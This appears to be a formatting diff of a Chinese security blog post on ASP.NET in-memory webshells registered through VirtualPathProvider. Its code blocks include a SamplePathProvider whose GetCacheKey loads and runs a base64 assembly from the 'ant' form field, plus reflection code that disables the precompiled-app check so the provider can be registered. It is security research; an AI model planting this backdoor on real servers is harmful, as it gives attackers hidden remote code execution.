@@ -10,13 +10,12 @@
     <title>ASP.NET下的内存马(四) VirtualPath内存马 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="ASP.NET下的内存马(四) VirtualPath内存马" />
 <meta property="og:description" content="本文首发于：https://tttang.com/archive/1488/ 1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-05-04T15:14:50+00:00" />
 <meta property="article:modified_time" content="2022-05-04T15:14:50+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="ASP.NET下的内存马(四) VirtualPath内存马"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="ASP.NET下的内存马(四) VirtualPath内存马"/>
 <meta name="twitter:description" content="本文首发于：https://tttang.com/archive/1488/ 1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -213,7 +212,7 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">VirtualPathProvider</span><span class="err">类提供一组方法，用于实现</span> <span class="n">Web</span> <span class="err">应用程序的虚拟文件系统。</span> <span class="err">在虚拟文件系统中，文件和目录由服务器操作系统提供的文件系统外的其他数据存储管理。</span> <span class="err">例如，可以使用虚拟文件系统将内容存储在</span><span class="n">SQL</span> <span class="n">Server</span><span class="err">数据库中。</span>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">VirtualPathProvider类提供一组方法</span><span class="err">，用于实现</span> <span class="n">Web</span> <span class="err">应用程序的虚拟文件系统。</span> <span class="err">在虚拟文件系统中，文件和目录由服务器操作系统提供的文件系统外的其他数据存储管理。</span> <span class="err">例如，可以使用虚拟文件系统将内容存储在</span><span class="n">SQL</span> <span class="n">Server数据库中</span><span class="err">。</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="err">可以将请求处理的任何文件存储在虚拟文件系统中。</span> <span class="err">这包括：</span>
 </span></span><span class="line"><span class="cl">
@@ -257,13 +256,13 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">System.Web.Hosting</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="k">abstract</span> <span class="k">class</span> <span class="nc">VirtualFile</span> <span class="p">:</span> <span class="n">VirtualFileBase</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">abstract</span> <span class="k">class</span> <span class="nc">VirtualFile</span> <span class="p">:</span> <span class="n">VirtualFileBase</span>
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="n">VirtualFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="k">this</span><span class="p">.</span><span class="n">_virtualPath</span> <span class="p">=</span> <span class="n">VirtualPath</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="n">VirtualFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="k">this</span><span class="p">.</span><span class="n">_virtualPath</span> <span class="p">=</span> <span class="n">VirtualPath</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">override</span> <span class="kt">bool</span> <span class="n">IsDirectory</span> <span class="p">=&gt;</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">override</span> <span class="kt">bool</span> <span class="n">IsDirectory</span> <span class="p">=&gt;</span> <span class="kc">false</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">abstract</span> <span class="n">Stream</span> <span class="n">Open</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">abstract</span> <span class="n">Stream</span> <span class="n">Open</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
@@ -335,29 +334,29 @@
 </span><span class="lnt">61
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">class</span> <span class="nc">SamplePathProvider</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualPathProvider</span>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">SamplePathProvider</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualPathProvider</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="kt">string</span> <span class="n">_virtualDir</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="kt">string</span> <span class="n">_fileContent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">string</span> <span class="n">_virtualDir</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">string</span> <span class="n">_fileContent</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="n">SamplePathProvider</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualDir</span><span class="p">,</span> <span class="kt">string</span> <span class="n">fileContent</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">SamplePathProvider</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualDir</span><span class="p">,</span> <span class="kt">string</span> <span class="n">fileContent</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="p">:</span> <span class="k">base</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="n">_virtualDir</span> <span class="p">=</span> <span class="n">virtualDir</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">            <span class="n">_fileContent</span> <span class="p">=</span> <span class="n">fileContent</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="kt">bool</span> <span class="n">IsPathVirtual</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">bool</span> <span class="n">IsPathVirtual</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">String</span> <span class="n">checkPath</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">VirtualPathUtility</span><span class="p">.</span><span class="n">ToAppRelative</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">checkPath</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="n">_virtualDir</span><span class="p">.</span><span class="n">ToLower</span><span class="p">());</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">override</span> <span class="kt">bool</span> <span class="n">FileExists</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">override</span> <span class="kt">bool</span> <span class="n">FileExists</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">IsPathVirtual</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">            <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">            <span class="p">}</span>
 </span></span><span class="line"><span class="cl">            <span class="k">else</span>
 </span></span><span class="line"><span class="cl">            <span class="p">{</span>
@@ -366,7 +365,7 @@
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">override</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualFile</span> <span class="n">GetFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">override</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualFile</span> <span class="n">GetFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">IsPathVirtual</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">new</span> <span class="n">SampleVirtualFile</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">,</span> <span class="n">_fileContent</span><span class="p">);</span>
@@ -375,22 +374,22 @@
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">class</span> <span class="nc">SampleVirtualFile</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualFile</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">class</span> <span class="nc">SampleVirtualFile</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualFile</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="kt">string</span> <span class="n">_fileContent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">string</span> <span class="n">_fileContent</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">bool</span> <span class="n">Exists</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">bool</span> <span class="n">Exists</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="n">SampleVirtualFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">,</span> <span class="kt">string</span> <span class="n">fileContent</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">SampleVirtualFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">,</span> <span class="kt">string</span> <span class="n">fileContent</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="p">:</span> <span class="k">base</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="n">_fileContent</span> <span class="p">=</span> <span class="n">fileContent</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">override</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Stream</span> <span class="n">Open</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">override</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Stream</span> <span class="n">Open</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Stream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">_fileContent</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">stream</span><span class="p">;</span>
@@ -412,9 +411,9 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">RegisterVirtualPathProvider</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">virtualPathProvider</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">RegisterVirtualPathProvider</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">virtualPathProvider</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">_theHostingEnvironment</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">_theHostingEnvironment</span> <span class="p">==</span> <span class="kc">null</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidOperationException</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">BuildManager</span><span class="p">.</span><span class="n">IsPrecompiledApp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
@@ -440,14 +439,14 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">internal</span> <span class="k">static</span> <span class="k">void</span> <span class="n">RegisterVirtualPathProviderInternal</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">virtualPathProvider</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">internal</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">RegisterVirtualPathProviderInternal</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">virtualPathProvider</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">VirtualPathProvider</span> <span class="n">virtualPathProvider1</span> <span class="p">=</span> <span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">_theHostingEnvironment</span><span class="p">.</span><span class="n">_virtualPathProvider</span><span class="p">;</span><span class="c1">//获取原来的VPP对象</span>
 </span></span><span class="line"><span class="cl">    <span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">_theHostingEnvironment</span><span class="p">.</span><span class="n">_virtualPathProvider</span> <span class="p">=</span> <span class="n">virtualPathProvider</span><span class="p">;</span><span class="c1">//把指针指向新注册的VPP对象</span>
 </span></span><span class="line"><span class="cl">    <span class="n">virtualPathProvider</span><span class="p">.</span><span class="n">Initialize</span><span class="p">(</span><span class="n">virtualPathProvider1</span><span class="p">);</span><span class="c1">//调用新注册VPP的Initialize</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">internal</span> <span class="k">virtual</span> <span class="k">void</span> <span class="n">Initialize</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">previous</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kd">internal</span> <span class="k">virtual</span> <span class="k">void</span> <span class="n">Initialize</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">previous</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_previous</span> <span class="p">=</span> <span class="n">previous</span><span class="p">;</span><span class="c1">//把原有的vpp设置为当前vpp的上一个节点</span>
 </span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">Initialize</span><span class="p">();</span>
@@ -573,15 +572,15 @@
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">class</span> <span class="nc">SamplePathProvider</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualPathProvider</span>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">SamplePathProvider</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualPathProvider</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">override</span> <span class="kt">string</span> <span class="n">GetCacheKey</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">override</span> <span class="kt">string</span> <span class="n">GetCacheKey</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="k">try</span>
 </span></span><span class="line"><span class="cl">            <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                <span class="n">HttpContext</span> <span class="n">context</span> <span class="p">=</span> <span class="n">HttpContext</span><span class="p">.</span><span class="n">Current</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">Payload</span> <span class="p">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;ant&#34;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">Payload</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">Payload</span> <span class="p">!=</span> <span class="kc">null</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">                <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                    <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span> <span class="n">assembly</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">                    <span class="n">assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">assembly</span><span class="p">.</span><span class="n">GetName</span><span class="p">().</span><span class="n">Name</span> <span class="p">+</span> <span class="s">&#34;.Run&#34;</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="n">context</span><span class="p">);</span>
@@ -627,11 +626,11 @@
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">FieldInfo</span> <span class="n">field_isPrecompiledAppComputed</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">FieldInfo</span> <span class="n">field_isPrecompiledApp</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_theBuildManager_instance</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_isPrecompiledAppComputed_oldValue</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_isPrecompiledApp_oldValue</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">FieldInfo</span> <span class="n">field_isPrecompiledAppComputed</span> <span class="p">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">FieldInfo</span> <span class="n">field_isPrecompiledApp</span> <span class="p">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_theBuildManager_instance</span> <span class="p">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_isPrecompiledAppComputed_oldValue</span> <span class="p">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_isPrecompiledApp_oldValue</span> <span class="p">=</span> <span class="kc">null</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">var</span> <span class="n">typeBuildManager</span> <span class="p">=</span> <span class="k">typeof</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Compilation</span><span class="p">.</span><span class="n">BuildManager</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">FieldInfo</span> <span class="n">field_theBuildManager</span> <span class="p">=</span> <span class="n">typeBuildManager</span><span class="p">.</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_theBuildManager&#34;</span><span class="p">,</span>
@@ -640,14 +639,14 @@
 </span></span><span class="line"><span class="cl">                                                           <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">field_isPrecompiledApp</span> <span class="p">=</span> <span class="n">typeBuildManager</span><span class="p">.</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_isPrecompiledApp&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">                                                   <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="n">field_theBuildManager_instance</span> <span class="p">=</span> <span class="n">field_theBuildManager</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="k">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">field_theBuildManager_instance</span> <span class="p">=</span> <span class="n">field_theBuildManager</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">field_isPrecompiledApp_oldValue</span> <span class="p">=</span> <span class="n">field_isPrecompiledApp</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">field_theBuildManager_instance</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="kt">bool</span><span class="p">)</span> <span class="n">field_isPrecompiledApp_oldValue</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// To disable isPrecompiledApp settings</span>
-</span></span><span class="line"><span class="cl">    <span class="n">field_isPrecompiledAppComputed</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">field_theBuildManager_instance</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">field_isPrecompiledApp</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">field_theBuildManager_instance</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">field_isPrecompiledAppComputed</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">field_theBuildManager_instance</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">field_isPrecompiledApp</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">field_theBuildManager_instance</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
